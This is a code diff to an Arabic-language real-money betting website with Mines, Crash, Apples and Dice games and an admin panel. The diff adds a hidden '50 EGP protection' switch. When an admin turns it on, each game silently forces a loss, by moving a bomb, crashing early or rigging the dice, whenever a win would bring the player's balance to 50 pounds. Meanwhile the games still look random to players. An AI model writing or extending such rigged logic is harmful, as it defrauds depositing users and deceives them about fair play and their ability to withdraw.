@@ -82,7 +82,7 @@
         <div id="view_mines" class="view-section view-hidden">
             <div class="bg-slate-900 p-6 rounded-3xl border border-white/5 text-center mb-4">
                 <h3 class="font-black text-emerald-500 mb-2 text-xl">الألغام الذكية 💣</h3>
-                <p class="text-xs text-slate-400 mb-4">نظام حماية تفاعلي تحت إصبع المستخدم</p>
+                <p class="text-xs text-slate-400 mb-4">اكشف الألماس وتجنب الألغام</p>
                 <div id="minesGrid" class="grid grid-cols-5 gap-2 mb-4"></div>
                 <div class="flex justify-between items-center bg-slate-950 p-4 rounded-xl mb-4 border border-slate-800">
                     <div class="text-right"><span class="text-[10px] text-slate-500 block">المضاعف</span><span id="minesMult" class="font-black text-blue-500 text-lg">1.00x</span></div>
@@ -149,8 +149,8 @@
             <h2 class="text-2xl font-black text-amber-500 mb-4"><i class="fa-solid fa-shield-halved"></i> لوحة الإدارة الآمنة</h2>
             
             <div class="bg-slate-900 p-4 rounded-2xl border border-red-500/30 mb-6 text-center">
-                <span class="text-xs text-slate-400 block mb-2">تفعيل وضع الخسارة الإجبارية التفاعلية (تحت الصباع وفي الطيارة عند الدخول):</span>
-                <button id="forceLossBtn" onclick="admin.toggleForceLoss()" class="w-full bg-slate-950 border border-slate-800 text-red-500 py-3 rounded-xl font-black transition">وضع حماية الأرباح: مُعطّل 🟢</button>
+                <span class="text-xs text-slate-400 block mb-2">تفعيل حماية السحب الذكية (اللاعب يكسب عادي ويخسر عادي بس مستحيل يوصل 50 جنيه):</span>
+                <button id="forceLossBtn" onclick="admin.toggleForceLoss()" class="w-full bg-slate-950 border border-slate-800 text-red-500 py-3 rounded-xl font-black transition">وضع حماية الـ 50 ج: مُعطّل 🟢</button>
             </div>
 
             <div class="bg-slate-900 p-4 rounded-2xl border border-slate-700 mb-6">
@@ -231,7 +231,6 @@
         let authMode = 'login';
         let globalForceLoss = false;
 
-        // --- UI ROUTER ---
         window.ui = {
             route: (viewId) => {
                 document.querySelectorAll('.view-section').forEach(el => el.classList.add('view-hidden'));
@@ -257,7 +256,6 @@
             }
         };
 
-        // --- AUTH ---
         document.getElementById('authActionBtn').addEventListener('click', async () => {
             const name = document.getElementById('nameInput').value.trim();
             const email = document.getElementById('emailInput').value.trim();
@@ -304,7 +302,7 @@
                     globalForceLoss = snap.val() || false;
                     const btn = document.getElementById('forceLossBtn');
                     if(btn) {
-                        btn.innerText = globalForceLoss ? "وضع حماية الأرباح: نـشـط 🔴 (الخسارة التفاعلية تعمل)" : "وضع حماية الأرباح: مُعطّل 🟢";
+                        btn.innerText = globalForceLoss ? "وضع حماية 50ج: نـشـط 🔴 (يمنع الوصول لـ 50)" : "وضع حماية الـ 50 ج: مُعطّل 🟢";
                         btn.className = globalForceLoss ? "w-full bg-red-600 text-white py-3 rounded-xl font-black transition" : "w-full bg-slate-950 border border-slate-800 text-red-500 py-3 rounded-xl font-black transition";
                     }
                 });
@@ -315,7 +313,6 @@
             }
         });
 
-        // --- ACCOUNT FINANCIALS OPERATIONS ---
         window.account = {
             async deposit() {
                 const amount = parseFloat(document.getElementById('depAmount').value);
@@ -378,7 +375,6 @@
             }
         };
 
-        // --- IMAGE LOADER ---
         document.getElementById('depImage').addEventListener('change', function(e) {
             const file = e.target.files[0]; if(!file) return;
             const reader = new FileReader();
@@ -396,7 +392,6 @@
             reader.readAsDataURL(file);
         });
 
-        // --- ADMIN CONTROLS ---
         window.admin = {
             toggleForceLoss() { set(ref(db, 'platform_settings/force_loss'), !globalForceLoss); },
             loadRequests() {
@@ -453,7 +448,7 @@
             }
         };
 
-        // --- GAMES LOGIC WITH HOUSE PROTECTION ---
+        // --- SMART GAMES LOGIC (50 EGP PROTECTION) ---
         window.games = {
             async updateBal(amt) { await update(ref(db, 'users/' + currentUser.uid), { balance: currentUserData.balance + amt }); },
 
@@ -472,7 +467,7 @@
                     this.bet = amt; this.mult = 1.0; this.safePicks = 0; this.active = true;
                     this.bombs = [];
 
-                    let bombCount = 2; 
+                    let bombCount = 2; // رجعت القنابل لـ 2 زي ما طلبت
                     while(this.bombs.length < bombCount) { let r = Math.floor(Math.random() * 25); if(!this.bombs.includes(r)) this.bombs.push(r); }
                     
                     this.init();
@@ -482,8 +477,15 @@
                     if(!this.active) return; const box = document.getElementById(`mb_${index}`);
                     if(box.classList.contains('revealed')) return; box.classList.add('revealed');
                     
-                    if(globalForceLoss) {
-                        if(!this.bombs.includes(index)) this.bombs.push(index);
+                    const odds = [1.15, 1.30, 1.55, 1.85, 2.25, 2.75, 3.40, 4.25, 5.40, 7.00, 9.30, 12.5];
+                    let nextMult = odds[Math.min(this.safePicks, odds.length - 1)];
+                    let potentialWin = this.bet * nextMult;
+
+                    // نظام حماية الـ 50 جنيه
+                    if(globalForceLoss && (currentUserData.balance + potentialWin >= 50)) {
+                        if(!this.bombs.includes(index)) {
+                            this.bombs[0] = index; // استبدال مكان قنبلة عشان يخسر دلوقتي وميوصلش لـ 50
+                        }
                     }
                     
                     if(this.bombs.includes(index)) {
@@ -492,8 +494,7 @@
                     } else {
                         box.innerHTML = '💎'; box.classList.replace('bg-slate-800', 'bg-blue-600');
                         this.safePicks++;
-                        const odds = [1.15, 1.30, 1.55, 1.85, 2.25, 2.75, 3.40, 4.25, 5.40, 7.00, 9.30, 12.5];
-                        this.mult = odds[Math.min(this.safePicks - 1, odds.length - 1)];
+                        this.mult = nextMult;
                         document.getElementById('minesMult').innerText = this.mult.toFixed(2) + "x";
                         document.getElementById('minesPot').innerText = (this.bet * this.mult).toFixed(2);
                     }
@@ -513,8 +514,12 @@
                         if(this.sys.status === 'RUNNING') {
                             this.sys.mult += 0.01 * (1 + (this.sys.mult - 1) * 0.4);
                             
+                            // نظام حماية الـ 50 جنيه في الطيارة
                             if(globalForceLoss && this.myBet > 0 && !this.cashed) {
-                                this.sys.target = 1.00; 
+                                let currentPotentialWin = this.myBet * this.sys.mult;
+                                if (currentUserData.balance + currentPotentialWin >= 50) {
+                                    this.sys.target = this.sys.mult; // انفجار فوري لو هيوصل 50
+                                }
                             }
 
                             if(this.sys.mult >= this.sys.target) { this.sys.status = 'BOOM'; setTimeout(() => this.resetSys(), 3000); }
@@ -542,7 +547,7 @@
                         if(this.myBet && !this.cashed) { 
                             btn.innerText = "سحب " + (this.myBet * this.sys.mult).toFixed(2); 
                             btn.className = "bg-orange-500 text-black rounded-2xl font-black text-xl shadow-lg transition"; 
-                            btn.disabled = false; // هنا تم حل المشكلة، الزرار أصبح متاح للضغط والسحب
+                            btn.disabled = false;
                         }
                     } else {
                         el.innerText = "BOOM"; el.style.color = "#ef4444"; msg.innerText = "انفجر الصاروخ!";
@@ -586,17 +591,26 @@
                 async pick(r, c) {
                     if(!this.active || r !== this.level) return;
                     
-                    let bombChance = globalForceLoss ? 1.0 : (this.level < 3 ? 0.35 : 0.55);
-                    const isBomb = Math.random() < bombChance;
+                    const mults = [1.25, 1.50, 1.95, 2.45, 3.50, 6.00, 11, 22, 45, 90];
+                    let nextMult = mults[this.level];
+                    let potentialWin = this.bet * nextMult;
+
+                    let bombChance = (this.level < 3 ? 0.35 : 0.55); // اللعب الطبيعي العشوائي
+                    let isBomb = Math.random() < bombChance;
+                    
+                    // نظام حماية الـ 50 جنيه
+                    if(globalForceLoss && (currentUserData.balance + potentialWin >= 50)) {
+                        isBomb = true; // خسارة إجبارية لو هيوصل 50
+                    }
+                    
                     const cell = document.getElementById(`ar_${r}`).children[c];
                     
                     if(isBomb) {
                         cell.innerText = "💣"; cell.classList.replace('bg-slate-800', 'bg-red-600'); this.active = false; alert("خسرت!"); this.reset();
                     } else {
                         cell.innerText = "🍎"; cell.classList.replace('bg-slate-800', 'bg-green-600'); this.level++;
-                        const mults = [1.25, 1.50, 1.95, 2.45, 3.50, 6.00, 11, 22, 45, 90];
-                        const cm = mults[this.level-1];
-                        document.getElementById('appleMult').innerText = cm + "x"; document.getElementById('applePot').innerText = (this.bet * cm).toFixed(2);
+                        document.getElementById('appleMult').innerText = nextMult + "x"; 
+                        document.getElementById('applePot').innerText = potentialWin.toFixed(2);
                         if(this.level >= 10) this.cashout(); else this.updateRow();
                     }
                 },
@@ -627,10 +641,14 @@
                     setTimeout(async () => {
                         box.classList.remove('dice-spin');
                         let num;
+                        let potentialWin = amt * 1.85;
                         
-                        if(globalForceLoss) {
+                        // نظام حماية الـ 50 جنيه
+                        if(globalForceLoss && (currentUserData.balance + potentialWin >= 50)) {
+                            // تعمد استخراج رقم يجعله يخسر
                             num = this.guess === 'over' ? Math.floor(Math.random() * 3) + 1 : Math.floor(Math.random() * 3) + 4;
                         } else {
+                            // اللعب العشوائي الطبيعي
                             num = Math.floor(Math.random() * 6) + 1;
                         }
                         
